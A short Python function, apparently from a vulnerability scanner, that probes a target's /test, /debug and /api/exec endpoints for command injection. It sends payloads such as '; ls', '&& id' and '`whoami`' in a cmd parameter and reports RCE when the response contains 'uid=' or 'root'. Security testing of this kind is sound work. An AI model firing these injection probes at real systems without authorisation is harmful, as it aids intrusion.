import requests

def execute(target):
    print(f"[INFO] Probando RCE en: {target}")
    endpoints = ["/test", "/debug", "/api/exec"]
    payloads = ["; ls", "&& id", "`whoami`"]
    vulnerable = False

    for endpoint in endpoints:
        for payload in payloads:
            url = f"http://{target}{endpoint}?cmd={payload}"
            try:
                response = requests.get(url, timeout=5)
                if "uid=" in response.text or "root" in response.text:
                    vulnerable = True
                    print(f"[ALERTA] RCE detectado en {url} con payload: {payload}")
            except Exception as e:
                print(f"[ERROR] Error al probar RCE en {url}: {e}")
    return "Vulnerable a RCE" if vulnerable else "No vulnerable"